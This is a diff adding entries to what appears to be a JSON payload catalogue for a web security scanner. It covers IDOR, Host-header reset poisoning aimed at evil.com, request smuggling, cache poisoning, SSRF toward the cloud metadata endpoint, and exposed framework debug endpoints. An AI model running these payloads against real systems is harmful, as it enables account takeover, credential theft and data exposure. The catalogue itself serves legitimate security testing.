@@ -603,5 +603,122 @@
     "target_patterns": ["random.random()", "Math.random()", "rand()"],
     "payloads": ["grep -rn 'import random' . | grep -v '#'"],
     "impact": "high"
+  },
+  {
+    "id": "authz-005",
+    "category": "authz",
+    "subcategory": "idor",
+    "name": "Dual-identity IDOR matrix",
+    "description": "Prove BOLA by comparing anonymous / user-A / user-B on the same object ID",
+    "target_params": ["id", "user_id", "order_id", "document_id", "tenant_id"],
+    "target_patterns": ["REST object detail", "GraphQL node(id)", "export/download endpoints"],
+    "payloads": [
+      "GET /api/orders/{victim_id} with user_A token",
+      "GET /api/orders/{victim_id} with no Authorization",
+      "GET /api/orders/{victim_id} with user_B token"
+    ],
+    "error_indicators": ["victim email/PII in body under wrong session", "200 with foreign owner_id"],
+    "impact": "high",
+    "bypass_notes": "Missing auth ≠ IDOR. Own-data-only 200 is not a finding."
+  },
+  {
+    "id": "auth-004",
+    "category": "auth",
+    "subcategory": "password_reset",
+    "name": "Host-header password reset poisoning",
+    "description": "Inject Host/X-Forwarded-Host so reset emails point to attacker domain",
+    "target_params": [],
+    "target_patterns": ["/forgot-password", "/reset", "/account/recover"],
+    "payloads": [
+      "Host: evil.com",
+      "X-Forwarded-Host: evil.com",
+      "X-Forwarded-Host: evil.com\\r\\nX-Ignored: x"
+    ],
+    "error_indicators": ["reset link absolute URL uses evil.com"],
+    "impact": "critical",
+    "bypass_notes": "Without poisoned email/link proof, keep as informational."
+  },
+  {
+    "id": "smuggle-001",
+    "category": "http_smuggling",
+    "name": "CL.TE timing desync",
+    "description": "Ambiguous Content-Length vs Transfer-Encoding causes front-end/back-end desync",
+    "target_patterns": ["HTTP/1.1 reverse proxy", "CDN origin"],
+    "payloads": [
+      "Content-Length + Transfer-Encoding: chunked with 0\\r\\n\\r\\n prefix",
+      "TE.CL dual Content-Length"
+    ],
+    "error_indicators": ["timing > timeout on second request", "response desync / canary echo"],
+    "impact": "high"
+  },
+  {
+    "id": "cache-001",
+    "category": "cache_poison",
+    "name": "Unkeyed X-Forwarded-Host cache poison",
+    "description": "Inject unkeyed header; confirm canary persists for other clients",
+    "target_patterns": ["CDN cached pages", "CF-Cache-Status: HIT"],
+    "payloads": [
+      "X-Forwarded-Host: canary.evil",
+      "X-Original-URL: /canary",
+      "X-Rewrite-URL: /canary"
+    ],
+    "error_indicators": ["canary reflected after request without header", "Age increases with poisoned body"],
+    "impact": "high"
+  },
+  {
+    "id": "stack-001",
+    "category": "framework",
+    "subcategory": "nextjs",
+    "name": "Next.js /_next/image SSRF",
+    "description": "Image optimizer fetches attacker-controlled or internal URLs",
+    "target_patterns": ["/_next/image?url=", "x-nextjs"],
+    "payloads": [
+      "/_next/image?url=http://127.0.0.1:80/",
+      "/_next/image?url=http://169.254.169.254/latest/meta-data/"
+    ],
+    "impact": "high",
+    "bypass_notes": "Only test when Next.js fingerprint is present."
+  },
+  {
+    "id": "stack-002",
+    "category": "framework",
+    "subcategory": "springboot",
+    "name": "Spring Boot actuator exposure",
+    "description": "Unauthenticated actuator endpoints leak env, mappings, or heapdump",
+    "target_patterns": ["/actuator", "/actuator/env", "X-Application-Context"],
+    "payloads": [
+      "GET /actuator",
+      "GET /actuator/env",
+      "GET /actuator/mappings"
+    ],
+    "impact": "critical",
+    "bypass_notes": "Sanitize findings — never attach full heapdump."
+  },
+  {
+    "id": "stack-003",
+    "category": "framework",
+    "subcategory": "laravel",
+    "name": "Laravel Telescope / debug exposure",
+    "description": "Unauthenticated Telescope/Horizon or APP_DEBUG stack traces leak secrets",
+    "target_patterns": ["/telescope", "/horizon", "_ignition", "Whoops"],
+    "payloads": [
+      "GET /telescope",
+      "GET /horizon",
+      "GET /_ignition/health-check"
+    ],
+    "impact": "high"
+  },
+  {
+    "id": "graphql-001",
+    "category": "graphql",
+    "name": "GraphQL node IDOR",
+    "description": "Global node(id) resolves other users' objects without field authz",
+    "target_patterns": ["/graphql", "application/graphql"],
+    "payloads": [
+      "query { node(id:\"victim_global_id\") { ... on User { email } } }",
+      "Aliased batch: a1:node(id:\"...\") a2:node(id:\"...\")"
+    ],
+    "impact": "high",
+    "bypass_notes": "Introspection alone is not a finding."
   }
 ]
